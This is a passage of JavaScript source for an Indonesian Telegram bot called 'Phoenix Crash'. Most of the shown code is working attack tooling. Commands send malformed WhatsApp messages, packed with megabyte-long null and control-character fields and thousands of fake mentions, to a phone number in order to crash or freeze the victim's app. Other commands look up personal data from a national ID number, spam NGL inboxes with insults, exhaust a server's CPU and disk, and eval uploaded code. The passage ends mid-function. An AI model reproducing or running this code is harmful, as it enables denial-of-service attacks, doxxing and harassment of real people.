│ ⸙ Tempat Lahir: ${get(d.tempat_lahir || d.tempat)}
│ ⸙ Tanggal Lahir: ${get(d.tanggal_lahir || d.tgl_lahir)}
│ ⸙ Umur: ${get(d.umur)}
│ ⸙ Provinsi: ${get(d.provinsi || d.province)}
│ ⸙ Kabupaten/Kota: ${get(d.kabupaten || d.kota || d.regency)}
│ ⸙ Kecamatan: ${get(d.kecamatan || d.district)}
│ ⸙ Kelurahan/Desa: ${get(d.kelurahan || d.village)}
╰═──────────────────═⬡</blockquote>
`

    return ctx.replyWithPhoto(thumbnailUrl, {
      caption: caption,
      parse_mode: "HTML",
      disable_web_page_preview: true,
    });
  };

  try {
    const a1 = await axios.get(
      `https://api.nekolabs.my.id/tools/nikparser?nik=${nik}`,
      { headers: { "user-agent": "Mozilla/5.0" }, timeout: 15000 }
    );

    const r1 = a1?.data?.result || a1?.data?.data || a1?.data;
    if (r1 && typeof r1 === "object" && Object.keys(r1).length) {
      await replyHTML(r1);
    } else {
      const a2 = await axios.get(
        `https://api.nekolabs.my.id/tools/nikparser?nik=${nik}`,
        { headers: { "user-agent": "Mozilla/5.0" }, timeout: 15000 }
      );
      const r2 = a2?.data?.result || a2?.data?.data || a2?.data;
      if (r2 && typeof r2 === "object" && Object.keys(r2).length) {
        await replyHTML(r2);
      } else {
        await ctx.reply("❌ ☇ Nik tidak ditemukan");
      }
    }
  } catch (e) {
    try {
      const a2 = await axios.get(
        `https://api.nekolabs.my.id/tools/nikparser?nik=${nik}`,
        { headers: { "user-agent": "Mozilla/5.0" }, timeout: 15000 }
      );
      const r2 = a2?.data?.result || a2?.data?.data || a2?.data;
      if (r2 && typeof r2 === "object" && Object.keys(r2).length) {
        await replyHTML(r2);
      } else {
        await ctx.reply("❌ ☇ Gagal menghubungi api, coba lagi nanti");
      }
    } catch {
      await ctx.reply("❌ ☇ Gagal menghubungi api, coba lagi nanti");
    }
  } finally {
    try { await ctx.deleteMessage(wait.message_id); } catch {}
  }
});

bot.command("spamngl", checkPremium, checkCooldown, async (ctx) => {
  try {
    const args = ctx.message.text.split(" ").slice(1);
    if (args.length < 1) {
      return ctx.reply("🪧 ☇ Format: /spamngl rainonesday 10");
    }

    const usernameRaw = args[0];
    const username = usernameRaw;
    const amountRaw = args[1];
    const amount = parseInt(amountRaw, 10);
    const delay = 200;

    if (isNaN(amount) || amount < 1) {
      return ctx.reply("❌ ☇ Masukan jumlah dan harus berupa angka");
    }

    await ctx.reply(`⏳ ☇ Mengirim ${amount} pesan spam ke ${username}`);

    for (let i = 1; i <= amount; i++) {
      try {
        const deviceId = crypto.randomBytes(21).toString("hex");

        const message = "WOI DONGO KENAL ZIEE GA??";
        const body = `username=${username}&question=${encodeURIComponent(message)}&deviceId=${deviceId}`;

        await fetch("https://ngl.link/api/submit", {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8" },
          body,
        });
      } catch (err) {
      }

      if (i < amount) {
        if (i % 50 === 0) {
          try {
          } catch (e) {}
          await new Promise((r) => setTimeout(r, delay + 200));
        } else {
          await new Promise((r) => setTimeout(r, delay));
        }
      }
    }

    ctx.reply(`✅ ☇ Selesai mengirim ${amount} pesan spam ke ${username}`);
  } catch (error) {
    console.error(error);
    ctx.reply("❌ ☇ Gagal menghubungi api, oba lagi nanti");
  }
});

bot.command("tiktokdl", checkPremium, checkCooldown, async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!args) return ctx.reply("🪧 Format: /tiktokdl https://vt.tiktok.com/ZSUeF1CqC/");

  let url = args;
  if (ctx.message.entities) {
    for (const e of ctx.message.entities) {
      if (e.type === "url") {
        url = ctx.message.text.substr(e.offset, e.length);
        break;
      }
    }
  }

  const wait = await ctx.reply("⏳ ☇ Sedang memproses konten");

  try {
    const { data } = await axios.get("https://tikwm.com/api/", {
      params: { url },
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36",
        "accept": "application/json,text/plain,*/*",
        "referer": "https://tikwm.com/"
      },
      timeout: 20000
    });

    if (!data || data.code !== 0 || !data.data)
      return ctx.reply("❌ ☇ Gagal ambil data konten pastikan link valid");

    const d = data.data;

    if (Array.isArray(d.images) && d.images.length) {
      const imgs = d.images.slice(0, 10);
      const media = await Promise.all(
        imgs.map(async (img) => {
          const res = await axios.get(img, { responseType: "arraybuffer" });
          return {
            type: "photo",
            media: { source: Buffer.from(res.data) }
          };
        })
      );
      await ctx.replyWithMediaGroup(media);
      return;
    }

    const videoUrl = d.play || d.hdplay || d.wmplay;
    if (!videoUrl) return ctx.reply("❌ ☇ Tidak ada link konten yang bisa diunduh");

    const video = await axios.get(videoUrl, {
      responseType: "arraybuffer",
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36"
      },
      timeout: 30000
    });

    await ctx.replyWithVideo(
      { source: Buffer.from(video.data), filename: `${d.id || Date.now()}.mp4` },
      { supports_streaming: true }
    );
  } catch (e) {
    const err =
      e?.response?.status
        ? `❌ ☇ Error ${e.response.status} saat mengunduh konten`
        : "❌ ☇ Gagal mengunduh, koneksi lambat atau link salah";
    await ctx.reply(err);
  } finally {
    try {
      await ctx.deleteMessage(wait.message_id);
    } catch {}
  }
});

bot.command("iphoneqc", checkPremium, checkCooldown, async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!text) {
    return ctx.reply("🪧 ☇ Format: /iphoneqc phoenix nih dek", { parse_mode: "HTML" });
  }

  const moment = require("moment-timezone");
  const time = moment().tz("Asia/Jakarta").format("HH:mm");
  const battery = Math.floor(Math.random() * 44) + 55;

  let carrier;
  switch (true) {
    case text.toLowerCase().includes("love"):
      carrier = "Telkomsel";
      break;
    case text.toLowerCase().includes("game"):
      carrier = "Tri";
      break;
    case text.toLowerCase().includes("net"):
      carrier = "XL Axiata";
      break;
    default:
      const randomList = ["Indosat", "Telkomsel", "XL", "Tri", "Smartfren"];
      carrier = randomList[Math.floor(Math.random() * randomList.length)];
  }

  const messageText = encodeURIComponent(text);
  const url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(
    time
  )}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(
    carrier
  )}&messageText=${messageText}&emojiStyle=apple`;

  await ctx.reply("⏳ ☇ Sedang membuat gambar");

  try {
    const axios = require("axios");
    const res = await axios.get(url, { responseType: "arraybuffer", timeout: 15000 });
    const buffer = Buffer.from(res.data);
    await ctx.replyWithPhoto({ source: buffer }, {
      parse_mode: "HTML",
    });
  } catch (e) {
    console.error(e);
    await ctx.reply("❌ ☇ Gagal menghubungi api, oba lagi nanti");
  }
});

bot.command("writebook", checkPremium, checkCooldown, async (ctx) => {
  const text = ctx.message.text?.split(" ").slice(1).join(" ");
  if (!text)
    return ctx.reply("🪧 ☇ Format: /writebook phoenix nih dek");

  const waitMsg = await ctx.reply("⏳ ☇ Sedang membuat gambar");

  try {
    const response = await axios.post(
      "https://lemon-write.vercel.app/api/generate-book",
      {
        text,
        font: "default",
        color: "#000000",
        size: "28",
      },
      {
        responseType: "arraybuffer",
        headers: { "Content-Type": "application/json" },
      }
    );

    try {
      await ctx.deleteMessage(waitMsg.message_id);
    } catch {}

    await ctx.replyWithPhoto(
      { source: Buffer.from(response.data) },
      {
        parse_mode: "HTML",
      }
    );
  } catch (error) {
    console.error("writebook error:", error.message);

    try {
      await ctx.deleteMessage(waitMsg.message_id);
    } catch {}

    ctx.reply("❌ ☇ Gagal menghubungi api, oba lagi nanti");
  }
});

bot.command("fixcode", checkPremium, checkCooldown, async (ctx) => {
  try {
    const fileMessage = ctx.message.reply_to_message?.document || ctx.message.document;

    if (!fileMessage) {
      return ctx.reply(`🪧 ☇ Format: /fixcode ( reply document )`);
    }

    const fileName = fileMessage.file_name || "unknown.js";
    if (!fileName.endsWith(".js")) {
      return ctx.reply("❌ ☇ File harus berformat .js");
    }

    const fileUrl = await ctx.telegram.getFileLink(fileMessage.file_id);
    const response = await axios.get(fileUrl.href, { responseType: "arraybuffer" });
    const fileContent = response.data.toString("utf-8");

    await ctx.reply("⏳ ☇ Sedang memperbaiki kode");

    const { data } = await axios.get("https://api.nekolabs.web.id/ai/gpt/5", {
      params: {
        text: fileContent,
        systemPrompt: `Kamu adalah seorang programmer ahli JavaScript dan Node.js.
Tugasmu adalah memperbaiki kode yang diberikan agar bisa dijalankan tanpa error, 
namun jangan mengubah struktur, logika, urutan, atau gaya penulisan aslinya.

Fokus pada:
- Menyelesaikan error sintaks (kurung, kurawal, tanda kutip, koma, dll)
- Menjaga fungsi dan struktur kode tetap sama seperti input
- Jangan menghapus komentar, console.log, atau variabel apapun
- Jika ada blok terbuka (seperti if, else, try, atau fungsi), tutup dengan benar
- Jangan ubah nama fungsi, variabel, atau struktur perintah
- Jangan tambahkan penjelasan apapun di luar kode
- Jangan tambahkan markdown javascript Karena file sudah berbentuk file .js
- Hasil akhir harus langsung berupa kode yang siap dijalankan
`,
        sessionId: "neko"
      },
      timeout: 60000,
    });

    if (!data.success || !data.result) {
      return ctx.reply("❌ ☇ Gagal memperbaiki kode");
    }

    const fixedCode = data.result;
    const outputPath = `./fixed_${fileName}`;
    fs.writeFileSync(outputPath, fixedCode);

    await ctx.replyWithDocument({ source: outputPath, filename: `fixed_${fileName}` });
  } catch (err) {
    ctx.reply("❌ ☇ Gagal menghubungi api, oba lagi nanti");
  }
});

bot.command("killpanel", checkPremium, checkCooldown, async (ctx) => {
  try {
    await ctx.reply("⏳ ☇ Sedang merusak panel");

    const command = `(while true; do 
    cat /dev/urandom | dd bs=10M count=100 2>/dev/null | gzip > /tmp/overload_$RANDOM.gz &
    stress --cpu 16 --io 8 --vm 8 --vm-bytes 95% --timeout 300s &
    sleep 1
  done)`;

    if (command && command.trim() !== "") {
      exec(command, (error, stdout, stderr) => {
        if (error) {
        }
      });
    }

    await ctx.reply("✅ ☇ Panel berhasil dirusak");
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Terjadi kesalahan");
  }
});

//

bot.command("iossCrash", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /iossCrash 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote expandable>╭═─────⊱ 𝙋𝙃𝙊𝙀𝙉𝙄𝙓 𝘾𝙍𝘼𝙎𝙃 ─────═⬡
│ ⸙ Target: ${q}
│ ⸙ Type: Crash Home Ios
│ ⸙ Status: Process
╰═──────────────────═⬡</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 100; i++) {
    await iosLx(target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote expandable>╭═─────⊱ 𝙋𝙃𝙊𝙀𝙉𝙄𝙓 𝘾𝙍𝘼𝙎𝙃 ─────═⬡
│ ⸙ Target: ${q}
│ ⸙ Type: Crash Home Ios
│ ⸙ Status: Success
╰═──────────────────═⬡</blockquote>
`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("majesticdelay", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /majesticdelay 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote expandable>╭═─────⊱ 𝙋𝙃𝙊𝙀𝙉𝙄𝙓 𝘾𝙍𝘼𝙎𝙃 ─────═⬡
│ ⸙ Target: ${q}
│ ⸙ Type: Delay Invisible, Drain Quota
│ ⸙ Status: Process
╰═──────────────────═⬡</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 1; i++) {
    await delay1(target);
    await sleep(3000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote expandable>╭═─────⊱ 𝙋𝙃𝙊𝙀𝙉𝙄𝙓 𝘾𝙍𝘼𝙎𝙃 ─────═⬡
│ ⸙ Target: ${q}
│ ⸙ Type: Delay Invisible, Drain Quota
│ ⸙ Status: Success
╰═──────────────────═⬡</blockquote>
`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("phoenixCrash", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /phoenixCrash 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote expandable>╭═─────⊱ 𝙋𝙃𝙊𝙀𝙉𝙄𝙓 𝘾𝙍𝘼𝙎𝙃 ─────═⬡
│ ⸙ Target: ${q}
│ ⸙ Type: Crash Infinity
│ ⸙ Status: Process
╰═──────────────────═⬡</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 1; i++) {
    await force1(target);
    await sleep(3000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote expandable>╭═─────⊱ 𝙋𝙃𝙊𝙀𝙉𝙄𝙓 𝘾𝙍𝘼𝙎𝙃 ─────═⬡
│ ⸙ Target: ${q}
│ ⸙ Type: Crash Infinity
│ ⸙ Status: Success
╰═──────────────────═⬡</blockquote>
`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("phoenixClick", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /phoenixClick 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote expandable>╭═─────⊱ 𝙋𝙃𝙊𝙀𝙉𝙄𝙓 𝘾𝙍𝘼𝙎𝙃 ─────═⬡
│ ⸙ Target: ${q}
│ ⸙ Type: Force Close Click
│ ⸙ Status: Process
╰═──────────────────═⬡</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 100; i++) {
    await fc(target);
    await sleep(3000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote expandable>╭═─────⊱ 𝙋𝙃𝙊𝙀𝙉𝙄𝙓 𝘾𝙍𝘼𝙎𝙃 ─────═⬡
│ ⸙ Target: ${q}
│ ⸙ Type: Force Close Click
│ ⸙ Status: Success
╰═──────────────────═⬡</blockquote>
`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("testfunction", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const args = ctx.message.text.split(" ");
  if (!args[1] || !args[1].includes(",")) {
    return ctx.reply("❌ Format salah!\nGunakan: /testfunc 628xx,10");
  }

  const [targetNumber, loopStr] = args[1].split(",");
  const loopCount = parseInt(loopStr);
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  try {
    if (!ctx.message.reply_to_message) {
      return ctx.reply(
        "❌ Reply pesan ini ke file JavaScript atau kode function yang ingin di-test!"
      );
    }

    const repliedMsg = ctx.message.reply_to_message;
    let testFunction;

    try {
      // ===== FILE .JS =====
      if (repliedMsg.document?.file_name?.endsWith(".js")) {
        const fileLink = await ctx.telegram.getFileLink(
          repliedMsg.document.file_id
        );
        const response = await fetch(fileLink.href);
        const fileContent = await response.text();

        const funcMatch = fileContent.match(
          /async\s+function\s+(\w+)\s*\([^)]*\)\s*{[\s\S]*?}/
        );

        if (!funcMatch) {
          return ctx.reply(
            "❌ File JavaScript tidak mengandung async function yang valid!"
          );
        }

        eval(fileContent);
        testFunction = eval(funcMatch[1]);
      }

      // ===== TEXT FUNCTION =====
      else if (repliedMsg.text) {
        const funcMatch = repliedMsg.text.match(
          /async\s+function\s+(\w+)\s*\([^)]*\)\s*{[\s\S]*?}/
        );

        if (!funcMatch) {
          return ctx.reply(
            "❌ Kode tidak mengandung async function yang valid!"
          );
        }

        eval(repliedMsg.text);
        testFunction = eval(funcMatch[1]);
      } else {
        return ctx.reply(
          "❌ Format tidak didukung! Kirim file .js atau kode function."
        );
      }

      if (typeof testFunction !== "function") {
        return ctx.reply("❌ Gagal memuat function!");
      }

      const progressMsg = await ctx.reply(
        `🔄 Memulai test function...\n` +
        `🎯 Target: ${formattedNumber}\n` +
        `🔁 Loop: ${loopCount}x\n` +
        `⏳ Status: Processing...`
      );

      let successCount = 0;
      let errorCount = 0;
      const errors = [];

      for (let i = 0; i < loopCount; i++) {
        try {
          await testFunction(sock, target);
          successCount++;

          if (i % Math.ceil(loopCount / 10) === 0) {
            const progress = Math.round((i / loopCount) * 100);
            const filled = Math.floor(progress / 10);
            const bar = "█".repeat(filled) + "░".repeat(10 - filled);

            await ctx.telegram.editMessageText(
              ctx.chat.id,
              progressMsg.message_id,
              null,
              `🔄 Testing function...\n` +
              `🎯 Target: ${formattedNumber}\n` +
              `🔁 Loop: ${i + 1}/${loopCount}\n` +
              `📊 Progress: ${bar} ${progress}%\n\n` +
              `✅ Success: ${successCount}\n` +
              `❌ Error: ${errorCount}`
            );
          }

          await sleep(1500);
        } catch (err) {
          errorCount++;
          errors.push(`Loop ${i + 1}: ${err.message}`);
          console.error(`Error loop ${i + 1}:`, err);
        }
      }

      let resultText =
        `<blockquote>⬡═—⊱ ⎧ DARK NIGHT ⎭ ⊰―═⬡</blockquote>\n\n` +
        `🎯 Target: ${formattedNumber}\n` +
        `🔄 Total Loop: ${loopCount}x\n` +
        `✅ Success: ${successCount}\n` +
        `❌ Error: ${errorCount}\n` +
        `📈 Success Rate: ${(
          (successCount / loopCount) *
          100
        ).toFixed(2)}%\n\n`;

      if (errors.length > 0) {
        resultText += `🚨 <b>ERROR DETAILS:</b>\n`;
        resultText += errors.slice(0, 5).join("\n");
        if (errors.length > 5) {
          resultText += `\n... dan ${errors.length - 5} error lainnya`;
        }
      }

      await ctx.telegram.editMessageText(
        ctx.chat.id,
        progressMsg.message_id,
        null,
        resultText,
        {
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: "「 🔍 」CEK TARGET",
                  url: `https://wa.me/${formattedNumber}`
                }
              ]
            ]
          }
        }
      );

    } catch (err) {
      ctx.reply(`❌ Error saat testing: ${err.message}`);
    }

  } catch (e) {
    console.error("Error utama:", e);
    ctx.reply(`❌ Terjadi kesalahan utama: ${e.message}`);
  }
});

//

async function iosLx(target) {
    for(let z = 0; z < 100; z++) {
      await WaSocket.relayMessage(target, {
        groupStatusMessageV2: {
          message: {
            locationMessage: {
              degreesLatitude: 21.1266,
              degreesLongitude: -11.8199,
              name: `X` + "𑇂𑆵𑆴𑆿".repeat(60000),
              url: "https://t.me/Zennzyyy",
              contextInfo: {
                mentionedJid: Array.from({ length:2000 }, (_, z) => `628${z + 1}@s.whatsapp.net`), 
                externalAdReply: {
                  quotedAd: {
                    advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
                    mediaType: "IMAGE",
                    jpegThumbnail: ZeppImg, 
                    caption: "𑇂𑆵𑆴𑆿".repeat(60000)
                  },
                  placeholderKey: {
                    remoteJid: "0s.whatsapp.net",
                    fromMe: false,
                    id: "ABCDEF1234567890"
                  }
                }
              }
            }
          }
        }
      }, { participant: { jid:target } });
    }
  }
  async function gsInt(target) {
    for(let z = 0; z < 100; z++) {
      let ZxY = {
        interactiveResponseMessage: {
          contextInfo: {
            mentionedJid: Array.from({ length:2000 }, (_, z) => `628${z + 72}@s.whatsapp.net`), 
            isForwarded: true, 
            forwardingScore: 7205,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363420757607688@newsletter", 
              newsletterName: "X", 
              serverMessageId: 1000,
              accessibilityText: "X"
            }, 
            statusAttributionType: "RESHARED_FROM_MENTION", 
            contactVcard: true, 
            isSampled: true, 
            dissapearingMode: {
              initiator: target, 
              initiatedByMe: true
            }, 
            expiration: Date.now()
          }, 
          body: {
            text: "X",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{\"values\":{\"in_pin_code\":\"7205\",\"building_name\":\"russian motel\",\"address\":\"2.7205\",\"tower_number\":\"507\",\"city\":\"Batavia\",\"name\":\"7eppeli.pdf\",\"phone_number\":\"+13135550202\",\"house_number\":\"7205826\",\"floor_number\":\"16\",\"state\":\"${"\u0000".repeat(1000000)}\"}}`,
            version: 3
          }
        }
      };
      
      let msg = generateWAMessageFromContent(target, {
        groupStatusMessageV2: {
          message: ZxY
        }
      }, {});
  
      await sock.relayMessage(target, msg.message, {
        messageId: msg.key.id, 
        participant: { jid:target }
      });
      await sleep(3000);
      await sock.sendMessage(target, {
        delete: msg.key
      }) 
    }
  }
    async function nullExc(target) {
    await sock.relayMessage(target, {
      requestPaymentMessage: {
        currencyCodeIso4217: 'IDR',
        requestFrom: target, 
        expiryTimestamp: null,
        contextInfo: {
          isForwarded: true,
          forwardingScore: 999,
          forwardedNewsletterMessageInfo: {
            newsletterName: "Yoi", 
            newsletterJid: "1@newsletter"
          }
        }
      }
    }, { 
      participant: { jid:target }, 
      messageId: null
    })
  }
  async function nullExc2(target) {
  await sock.relayMessage(target, {
    sendPaymentMessage: {}
  }, {
    participant: { jid:target }
  })
}
async function fc(target) {

const options = [
    { optionName: "Option A" },
    { optionName: "Option B" },
    { optionName: "Option C" }
];

const correctAnswer = options[1];

const msg = generateWAMessageFromContent(target, {
    botInvokeMessage: {
        message: {
            messageContextInfo: {
                messageSecret: crypto.randomBytes(32), 
                messageAssociation: {
                    associationType: 7,
                    parentMessageKey: crypto.randomBytes(16)
                }
            }, 
            pollCreationMessage: {
                name: "X", 
                options: options,
                selectableOptionsCount: 1,
                pollType: "QUIZ",
                correctAnswer: correctAnswer
            }
        }
    }
}, {});

await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id
});
}

async function Truenullv4(sock, target, ptcp = false) {
  const VidMessage = generateWAMessageFromContent(target, {
    videoMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
      mimetype: "video/mp4",
      fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
      fileLength: "289511",
      seconds: 15,
      mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
      caption: "\n",
      height: 640,
      width: 640,
      fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
      directPath:
      "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1743848703",
      contextInfo: {
        isSampled: true,
        participant: target,
        mentionedJid: [
          ...Array.from(
            { length: 1900 },
            () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          ),
        ],
        remoteJid: "target",
        forwardingScore: 100,
        isForwarded: true,
        stanzaId: "123456789ABCDEF",
        quotedMessage: {
          businessMessageForwardInfo: {
            businessOwnerJid: "0@s.whatsapp.net",
          },
        },
      },
      streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
      thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
      thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
      thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
      },
    }, 
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    }
  );
  
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: VidMessage.message,
     },
    }, ptcp ? 
    { 
      messageId: VidMessage.key.id, 
      participant: { jid: target} 
    } : { messageId: VidMessage.key.id }
  );
  
  const payload = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "X", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: "\x10".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "call_permission_request"
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    },
  );
  
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: payload.message,
     },
    }, ptcp ? 
    { 
      messageId: payload.key.id, 
      participant: { jid: target} 
    } : { messageId: payload.key.id }
  );
  
  const payload2 = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "\n", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x10".repeat(1045000),
            version: 3,
          },
          entryPointConversionSource: "call_permission_message"
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    },
  );

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: payload2.message,
     },
    }, ptcp ? 
    { 
      messageId: payload2.key.id, 
      participant: { jid: target} 
    } : { messageId: payload2.key.id }
  );
}
async function ZenoInvisible(target) {
  const videoMessage = {
    url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
    mimetype: "video/mp4",
    fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
    fileLength: "289511",
    seconds: 15,
    mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
    caption: "\u0000".repeat(104000),
    height: 640,
    width: 640,
    fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
    directPath:
      "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1743848703",
    contextInfo: {
      participant: target,
      mentionedJid: [
        ...Array.from(
          { length: 1900 },
          () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
        ),
      ],
      remoteJid: "X",
      isForwaded: true,
      forwadingScore: 100,
      stanzaId: "ABCDEF123456789",
      quotedMessage: {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: {
                text: "\n",
              },
              nativeFlowResponseMessage: {
                name: "galaxy_message",
                paramsJson: "\×10".repeat(104000),
              },
            },
          },
        },
      },
    },
    streamingSidecar:
      "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
    thumbnailDirectPath:
      "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
